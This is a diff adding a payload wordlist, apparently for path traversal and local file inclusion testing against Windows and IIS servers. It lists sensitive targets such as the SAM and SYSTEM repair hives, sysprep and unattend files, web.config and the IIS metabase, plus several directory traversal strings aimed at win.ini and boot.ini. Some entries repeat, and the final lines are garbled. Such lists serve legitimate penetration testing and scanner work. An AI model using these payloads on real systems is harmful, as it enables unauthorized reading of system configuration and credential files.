@@ -1,0 +1,38 @@
+c:\windows\system32\license.rtf
+c:\windows\system32\eula.txt
+c:\windows\system32\win.ini
+c:\boot.ini
+c:\inetpub\logs\logfiles
+c:\inetpub\wwwroot\global.asa
+c:\inetpub\wwwroot\index.asp
+c:\inetpub\wwwroot\web.config
+c:\sysprep.inf
+c:\sysprep.xml
+c:\sysprep\sysprep.inf
+c:\sysprep\sysprep.xml
+c:\system32\inetsrv\metabase.xml
+c:\sysprep.inf
+c:\sysprep.xml
+c:\sysprep\sysprep.inf
+c:\sysprep\sysprep.xml
+c:\system volume information\wpsettings.dat
+c:\system32\inetsrv\metabase.xml
+c:\unattend.txt
+c:\unattend.xml
+c:\unattended.txt
+c:\unattended.xml
+c:\windows\repair\sam
+c:\windows\repair\system
+c:\AppServ\MySQL
+c:WINDOWS/system32/
+/C:\Program Files\
+/C:/inetpub/ftproot/
+/D:\Program Files\
+d:\AppServ\MySQL
+/..\..\..\..\..\..\winnt\win.ini
+../../windows/win.ini
+..//..//..//..//..//boot.ini
+..\../..\../boot.ini
+..\../..\../..\../..\../boot.ini
+\…..\\\…..\\\…..\\\
+=3D “/..” . “%2f..
